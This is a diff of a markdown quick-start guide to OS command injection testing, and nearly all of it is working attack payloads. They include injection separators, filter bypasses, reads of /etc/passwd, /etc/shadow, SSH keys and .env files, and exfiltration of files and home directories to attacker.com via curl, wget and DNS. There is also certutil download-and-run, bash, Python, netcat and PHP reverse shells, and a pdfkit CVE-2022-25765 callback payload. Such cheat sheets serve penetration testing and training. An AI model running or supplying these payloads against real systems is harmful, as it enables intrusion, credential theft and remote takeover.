@@ -1,363 +1,193 @@
-# OS Command Injection - Quick Start Guide
+# OS Command Injection — Quick Start
 
-## 🎯 5-Minute Quick Test
+## 5-minute quick test
 
-### Step 1: Test Time-Based Detection (2 minutes)
+### 1. Time-based detection (universal)
 
-**Goal**: Confirm vulnerability exists through response delay
-
-```bash
-# Inject this payload in any parameter:
-||sleep 5||
-
-# Examples:
-# URL: http://target.com/page?id=1||sleep 5||
-# POST: email=test||sleep 5||
+```
+input;sleep 5
+input&&sleep 5
+input|sleep 5
+input`sleep 5`
+input$(sleep 5)
+%0Asleep 5
 ```
 
-**Expected Result**: Response takes ~5 seconds
-**✅ If delayed**: VULNERABLE! Proceed to Step 2
-**❌ If not delayed**: Try alternative separators
+If response delays ~5s, command injection works. Try multiple separators — different shells / contexts allow different sets.
 
-### Step 2: Try Alternative Separators (1 minute)
+### 2. Output extraction
+
+```
+input;id
+input&&whoami
+input|cat /etc/passwd
+input`hostname`
+input$(uname -a)
+```
+
+Look for command output in response body.
+
+### 3. Common detection probe
 
 ```bash
-;sleep 5;
-|sleep 5|
+# Universal — try in this order
+;sleep 5
+&& sleep 5
+| sleep 5
 `sleep 5`
 $(sleep 5)
-%0asleep 5%0a
+%0a sleep 5            # newline
+%0d%0a sleep 5         # CRLF
 ```
 
-### Step 3: Extract Data (2 minutes)
+## Decision tree
 
-**If output is reflected:**
-```bash
-|whoami
+```
+Time-based works?
+├── Yes — extract output to confirm
+└── No — try blind via DNS/HTTP
+        $(curl http://attacker.com/$(whoami))
+        ;nslookup $(whoami).attacker.com
+        |wget http://attacker.com/$(id)
+
+Output reflected?
+├── Yes — direct extraction
+└── No — out-of-band exfil via DNS or HTTP
+
+Special chars filtered?
+├── ; filtered? → try && | || ` $()
+├── Spaces filtered? → use ${IFS} or $IFS$9
+├── Slashes filtered? → use base64 + decode
+└── Quotes filtered? → use \x22 or skip them
+```
+
+## Universal detection payloads
+
+```
+;id
+&&id
 |id
-|hostname
+`id`
+$(id)
+%0aid
+;sleep 5
+&& sleep 5
+| sleep 5
+$(sleep 5)
+`sleep 5`
+%0Asleep 5
 ```
 
-**If blind (no output):**
-```bash
-# Write to web directory
-||whoami>/var/www/html/out.txt||
+## Platform-specific
 
-# Then retrieve
-GET /out.txt
+**Linux:**
 ```
-
-**If out-of-band works:**
-```bash
-||nslookup `whoami`.burpcollaborator.net||
-```
-
----
-
-## 📋 Decision Tree
-
-```
-Can you see command output in response?
-│
-├─ YES → Direct injection
-│   └─ Payload: |whoami
-│   └─ Time: 30 seconds
-│
-└─ NO → Blind injection
-    │
-    ├─ Can you access file system?
-    │   └─ YES → Output redirection
-    │       └─ Payload: ||whoami>/var/www/html/out.txt||
-    │       └─ Time: 1 minute
-    │
-    └─ NO → Out-of-band or Time-based
-        │
-        ├─ Outbound connections allowed?
-        │   └─ YES → Out-of-band
-        │       └─ Payload: ||nslookup attacker.com||
-        │       └─ Time: 1 minute
-        │
-        └─ NO → Time-based
-            └─ Payload: ||sleep 5||
-            └─ Time: 30 seconds
-```
-
----
-
-## 🔥 Most Effective Payloads
-
-### Universal Detection (Test These First)
-
-```bash
-# 1. Time-based (most reliable)
-||sleep 5||
-
-# 2. Output-based (fastest if works)
-|whoami
-
-# 3. Out-of-band (bypasses filters)
-||nslookup attacker.com||
-```
-
-### Platform-Specific
-
-**Linux/Unix:**
-```bash
-||sleep 5||
-||ping -c 5 127.0.0.1||
-|whoami
-|id
-|uname -a
+;cat /etc/passwd
+;whoami
+;uname -a
+;ls -la /
+;cat /etc/shadow                  (root only)
+;curl http://attacker.com/$(whoami)
+;wget --post-data="$(cat /etc/passwd)" http://attacker.com/
+;bash -i >& /dev/tcp/attacker/4444 0>&1
 ```
 
 **Windows:**
-```bash
-||timeout /t 5||
-||ping -n 6 127.0.0.1||
-|whoami
-& whoami &
+```
+&dir
+&whoami
+&type C:\Windows\win.ini
+&systeminfo
+&powershell -enc <base64>
+&certutil -urlcache -f http://attacker.com/file.exe payload.exe
 ```
 
----
-
-## ⚡ Common Mistakes to Avoid
-
-| Mistake | Solution |
-|---------|----------|
-| ❌ Using wrong ping flag | ✅ Linux: `-c` Windows: `-n` |
-| ❌ Not URL encoding when needed | ✅ Use `+` for spaces or `%20` |
-| ❌ Testing only one parameter | ✅ Test ALL inputs systematically |
-| ❌ Too short time delays | ✅ Use 5+ seconds for clarity |
-| ❌ Not checking web-accessible paths | ✅ Try `/var/www/html/`, `/var/www/images/` |
-| ❌ Forgetting to poll Collaborator | ✅ Wait 5 seconds, then poll |
-
----
-
-## 🎓 Burp Suite Workflow
-
-### Fastest Method
+## Bypass space filter
 
 ```
-1. Intercept request → Ctrl+R (Send to Repeater)
-2. Modify parameter: ||sleep 5||
-3. Send → Check response time
-4. If delayed → Vulnerable!
-5. Extract data with appropriate technique
+{cat,/etc/passwd}                 # brace expansion
+cat$IFS/etc/passwd                # IFS variable
+cat${IFS}/etc/passwd
+cat<>/etc/passwd                  # redirection
+$IFS$9                            # Bash IFS
 ```
 
-### Systematic Testing
+## Bypass quote filter
 
 ```
-Tab 1 (Time-based):
-  email=test||sleep 5||
-  → Check response timer
-
-Tab 2 (Output):
-  email=test|whoami
-  → Search response (Ctrl+F)
-
-Tab 3 (OOB):
-  email=test||nslookup burpcollaborator.net||
-  → Check Collaborator tab
+\x22 / \x27                       # hex-escaped quotes
+$'\x22'                           # ANSI-C quoting
+echo -e
 ```
 
----
+## Bypass slash filter
 
-## 🛠️ Essential Commands
+```
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh    # base64 encoding
+```
 
-### Enumeration
+## Burp Suite workflow
+
+1. Identify input fields — file uploads, search, ping, lookup, system commands.
+2. Burp Repeater → inject `;sleep 5` and observe.
+3. Once confirmed, extract: `;cat /etc/passwd` then verify response.
+4. For blind: `;nslookup $(whoami).burpcollaborator.net`.
+
+## Quick enumeration commands
 
 ```bash
-# System info
-whoami              # Current user (30 sec)
-id                  # User ID (30 sec)
-hostname            # System name (30 sec)
-uname -a            # Full system info (1 min)
-
-# Quick wins
-cat /etc/passwd     # User list (1 min)
-cat /etc/hostname   # Hostname (30 sec)
-env                 # Environment vars (1 min)
-ps aux              # Running processes (1 min)
+;id; pwd; uname -a
+;ls -la / /home /tmp
+;cat /etc/passwd /etc/issue
+;ip a; netstat -tulnp
+;ps -ef
+;find / -perm -4000 2>/dev/null         # SUID
 ```
 
-### File Exfiltration
+## File exfiltration
 
 ```bash
-# Read sensitive files
-||cat /etc/passwd>/var/www/html/passwd.txt||
-||cat /etc/shadow>/var/www/html/shadow.txt||
-||cat ~/.ssh/id_rsa>/var/www/html/key.txt||
-
-# Application files
-||cat /var/www/html/config.php>/var/www/html/config.txt||
-||cat .env>/var/www/html/env.txt||
+;cat /etc/passwd | curl -X POST -d @- http://attacker.com/exfil
+;tar czf - /home | curl -X POST --data-binary @- http://attacker.com/exfil
+;cp /etc/shadow /tmp/visible/
 ```
 
-### Reverse Shell (Advanced)
+## Reverse shell
 
 ```bash
-# Bash reverse shell
-||bash -i >& /dev/tcp/ATTACKER/4444 0>&1||
-
-# Netcat
-||nc ATTACKER 4444 -e /bin/bash||
+# Bash
+;bash -i >& /dev/tcp/attacker/4444 0>&1
 
 # Python
-||python -c 'import socket,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/bash")'||
+;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'
+
+# Netcat
+;nc -e /bin/bash attacker 4444
+
+# PHP
+<?php system("bash -i >& /dev/tcp/attacker/4444 0>&1") ?>
 ```
 
----
+## Library patterns / mistakes / troubleshooting
 
-## 🎯 Testing Checklist
+**Sinks:** PHP `system()/exec()/shell_exec()/passthru()`; Python `os.system()`/`subprocess.*(shell=True)`; Node `child_process.exec()` or `spawn(...,{shell:true})`; Java `Runtime.exec(String)`/`ProcessBuilder` with shell.
 
-### Initial Detection (5 minutes)
+**Indicators:** "ping: ..." (input reaches ping); "no such file" (separator broke path); 500 (broken syntax — simpler separator); response delay = time-based confirmed.
 
-- [ ] Test time-based: `||sleep 5||`
-- [ ] Test output-based: `|whoami`
-- [ ] Test out-of-band: `||nslookup attacker.com||`
-- [ ] Try multiple separators: `;`, `|`, `||`, `&&`, `&`
-- [ ] Test all parameters (GET, POST, headers)
+**Mistakes:** forgetting URL encoding (`%26`/`%7c`/`%3b`); trying `&&` when `&` filtered; bash syntax to Windows host; single quotes inside single-quoted shell.
 
-### Exploitation (10 minutes)
+**Troubleshooting:** no change → separator filtered (try `%0a`, `%0d%0a`); 500 only → wrap parens / backticks; output truncated → `base64`-encode output; `cat` blocked → `tac`/`head`/`tail`.
 
-- [ ] Identify OS (Linux vs Windows)
-- [ ] Extract username: `whoami`
-- [ ] Read `/etc/passwd` or equivalent
-- [ ] Check privileges: `id` or `whoami /all`
-- [ ] Enumerate network: `ifconfig` or `ipconfig`
-- [ ] Find sensitive files: config files, SSH keys
+## Tools
 
-### Documentation (5 minutes)
+- Burp Suite Repeater / Intruder.
+- commix (`commix --url=http://target/?id=1`).
+- Custom curl + bash loop.
+- Burp Collaborator for blind / OAST.
 
-- [ ] Screenshot vulnerable request
-- [ ] Screenshot response showing exploitation
-- [ ] Document exact payload used
-- [ ] Note which parameter was vulnerable
-- [ ] Record impact (privilege level, data accessed)
+## Resources
 
----
-
-## 🚨 When You're Stuck
-
-### Troubleshooting Guide
-
-**Problem**: No response delay with `sleep` command
-
-**Solutions**:
-```bash
-# Try ping instead
-||ping -c 5 127.0.0.1||  # Linux
-||ping -n 6 127.0.0.1||  # Windows
-
-# Try timeout
-||timeout 5||
-
-# Check if command is blocked
-||tim${IFS}eout 5||      # Space bypass
-||sle${IFS}ep 5||
-```
-
----
-
-**Problem**: Can't find output file
-
-**Solutions**:
-```bash
-# Try common web paths
-||whoami>/var/www/html/out.txt||
-||whoami>/var/www/images/out.txt||
-||whoami>/usr/share/nginx/html/out.txt||
-||whoami>/tmp/out.txt||
-
-# Test with echo first
-||echo test123>/var/www/html/test.txt||
-```
-
----
-
-**Problem**: No DNS interaction
-
-**Solutions**:
-```bash
-# Try HTTP instead
-||curl http://burpcollaborator.net||
-||wget http://burpcollaborator.net||
-
-# Check if nslookup exists
-||which nslookup||
-||dig burpcollaborator.net||
-||host burpcollaborator.net||
-```
-
----
-
-## 📚 Learn More
-
-**Next steps after quick start:**
-- Study bypass techniques: `os-command-injection-cheat-sheet.md`
-- Practice on other platforms: HackTheBox, TryHackMe
-- Explore tool usage: Commix automation
-
-**Key resources:**
-- OWASP: https://owasp.org/www-community/attacks/Command_Injection
-- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
-
----
-
-## Injection Indicator Recognition
-
-Parameters likely passed to shell commands (prioritize testing these):
-
-| Indicator | Example | Shell Command Likely |
-|-----------|---------|---------------------|
-| Date/time format specifiers | `?format=%H:%M:%S`, `?fmt=%Y-%m-%d` | `date +FORMAT` |
-| Filename/path parameters | `?file=report.pdf`, `?path=/tmp/out` | `cat`, `ls`, `find` |
-| IP/hostname inputs | `?host=192.168.1.1`, `?target=example.com` | `ping`, `nslookup`, `dig` |
-| Conversion/encoding params | `?convert=pdf`, `?encode=base64` | `convert`, `base64` |
-| Search/grep-like features | `?pattern=error`, `?search=keyword` | `grep`, `find` |
-| Config validation fields | `?sendMailPath=`, `?binaryPath=`, `?compiler=` | `which`, `test -f`, `file` |
-
-When you see format specifiers matching shell tool syntax (e.g., `%H`, `%M`, `%S` for `date`; `%s`, `%d` for `printf`), the backend likely invokes that tool directly rather than using a language-native function.
-
-**\s regex trap**: If the app uses `\s` regex for space filtering (common in PHP `preg_match('/\s/', ...)`), note that `\s` matches ALL whitespace including `\n`, `\r`, `\t`. Newline injection (`%0a`) will NOT bypass it. Use `${IFS}` or `$IFS$9` instead — these are variable expansions, not whitespace characters.
-
----
-
-## Library-Specific Command Injection
-
-### URL-to-PDF Converters (pdfkit, wkhtmltopdf wrappers)
-When a web app converts URLs to PDFs, the URL parameter itself may be passed unsanitized to a library that shells out. Common in Ruby (pdfkit gem — CVE-2022-25765), Python (pdfkit), Node.js (html-pdf).
-
-**Payload format** (inject in the URL parameter value):
-```
-http://attacker/?name=%20`COMMAND`
-```
-The `%20` (URL-encoded space) before backticks is critical — it terminates the URL argument and starts shell interpretation.
-
-**Exfiltration via HTTP callback** (when no direct output):
-```
-http://attacker:9001/?name=%20`id | curl http://attacker:9001/ -d @-`
-```
-Start an HTTP listener, inject command piped to `curl POST`, read output from the POST body.
-
-**Detection**: Look for PDF generation features, "convert URL to PDF" functionality, Ruby/Sinatra/Puma tech stacks. Check PDF metadata (`exiftool output.pdf`) for generator strings like "pdfkit", "wkhtmltopdf".
-
----
-
-## Pro Tips
-
-1. **Always test time-based first** - It works even with strict filtering
-2. **Use Burp Repeater** - Faster than re-submitting forms
-3. **Test all parameters** - Don't stop at the obvious ones
-4. **URL encode when needed** - But not always necessary in POST body
-5. **Check response time** - Bottom right in Burp Repeater
-6. **Use tab groups** - Test multiple techniques simultaneously
-7. **Start simple** - Complex payloads can trigger WAFs
-8. **Document everything** - Screenshot as you go
-9. **Think like a defender** - What would you log/block?
-10. **Practice regularly** - Speed comes from repetition
-
----
-
-*Quick reference for OS command injection testing*
+- `os-command-injection-cheat-sheet.md` — comprehensive techniques.
+- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
+- CWE-78: OS Command Injection.
+- PayloadsAllTheThings/Command Injection.
